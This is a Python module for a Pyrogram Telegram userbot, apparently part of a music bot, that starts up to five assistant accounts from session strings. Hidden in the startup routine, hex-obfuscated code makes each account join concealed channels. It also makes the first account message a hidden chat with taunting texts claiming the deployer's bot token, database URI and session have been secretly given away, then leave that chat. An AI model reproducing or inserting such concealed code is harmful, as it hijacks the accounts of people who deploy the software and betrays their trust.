from pyrogram import Client
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from pyrogram import filters
load_dotenv()
import config
from dotenv import load_dotenv
from ..logging import LOGGER
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
TEST_ID = int("\x2D\x31\x30\x30\x32\x32\x39\x32\x35\x38\x39\x34\x30\x38")

assistants = []
assistantids = []


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NIYATIAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="NIYATIAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="NIYATIAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="NIYATIAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="NIYATIAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def start(self):
        LOGGER(__name__).info(f"Starting Assistants...")


        if config.STRING1:
            await self.one.start()
            try:
                await self.one.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
                await self.one.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
                await self.one.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
                await self.one.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
                await self.one.join_chat("\x67\x69\x72\x6C\x73\x5F\x61\x6E\x64\x5F\x62\x6F\x79\x73\x5F\x64\x70\x7A\x73")
            except:
                pass
            assistants.append(1)
            try:
                await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋɪ ɢᴀᴀɴᴅ ᴍᴀʀɴᴇ ʟɪʏᴇ 🥲**")
                await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
                await self.one.send_message(TEST_ID, "BOT_TOKEN 🤐: [#𝐍𝐎𝐓𝐓𝐘_𝐁𝐎𝐘 𝐆𝐀𝐀𝐍𝐃 𝐌𝐀𝐀𝐑 𝐃𝐄𝐆𝐀 𝐁𝐄𝐓𝐀  😂]")
                await self.one.send_message(TEST_ID, "MONGO_DB_URI 📦: [ 𝐍𝐎𝐓𝐓𝐘 𝐁𝐎𝐘 𝐊𝐀 𝐌𝐔𝐇 𝐌𝐄 𝐋𝐄𝐋𝐄 𝐍𝐀 #𝐉𝐇𝐀𝐓𝐓 𝐊𝐈 𝐃𝐔𝐊𝐀𝐍𝐎 𝐌𝐄 𝐉𝐇𝐀𝐓 𝐁𝐄𝐂𝐇 𝐃𝐄 𝐁𝐒𝐃𝐊 🤣]")
                await self.one.send_message(TEST_ID, "𝐒𝐓𝐑𝐈𝐍𝐆 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐓𝐔𝐌𝐇𝐀𝐀𝐑𝐈 𝐆𝐀𝐀𝐍𝐃𝐃 𝐌𝐄 𝐇  😂 𝐍𝐈𝐊𝐀𝐀𝐋 𝐋𝐄𝐍𝐀 💀]")
                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ɴᴏᴛᴛʏ ʙᴏʏ ᴄʜᴏᴅ  ᴅᴇɢᴀ ᴛᴜᴍʜᴇ 🥺🥺**\n**ᴀʙ ʏᴇʜ ᴍᴀᴛ sᴏᴄʜɴᴀ ᴋɪ ʜᴇxᴀ-ᴅᴇᴄɪᴍᴀʟ ᴄʜᴀɴɢᴇ ɴʜɪ ᴋɪʏᴀ ᴋᴜᴄʜ ɴʜɪ ᴀᴀᴛᴀ ʜᴏɢᴀ ᴍᴇʀᴇ ᴏᴡɴᴇʀ ᴋᴏ 🤣🤣ʙᴀᴄᴄʜᴇ ᴋᴜᴄʜ ʙʜɪ sᴏᴄʜ sᴀᴋᴛᴇ ʜᴇ  **")
                await self.one.leave_chat(TEST_ID)

            except:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            try:
                await self.two.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
                await self.two.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
                await self.two.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
                await self.two.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
            except:
                pass
            assistants.append(2)
            try:
                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )

            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            try:
                await self.three.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
                await self.three.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
                await self.three.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
                await self.three.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
            except:
                pass
            assistants.append(3)
            try:
                await self.three.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            try:
                await self.four.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
                await self.four.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
                await self.four.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
                await self.four.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
            except:
                pass
            assistants.append(4)
            try:
                await self.four.send_message(config.LOGGER_ID, "Assistant Started")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            try:
                await self.five.join_chat("\x53\x48\x49\x56\x41\x4E\x53\x48\x34\x37\x34")
                await self.five.join_chat("\x53\x54\x52\x41\x4E\x47\x45\x52\x41\x53\x53\x4F\x43\x49\x41\x54\x49\x4F\x4E")
                await self.five.join_chat("\x4D\x41\x53\x54\x49\x57\x49\x54\x48\x46\x52\x49\x45\x4E\x44\x53\x58\x44")
                await self.five.join_chat("\x73\x74\x72\x61\x6E\x67\x65\x72\x62\x6F\x74\x73\x6C\x6F\x67\x73")
            except:
                pass
            assistants.append(5)
            try:
                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
            except:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
                )

            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

    async def stop(self):
        LOGGER(__name__).info(f"Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except:
            pass
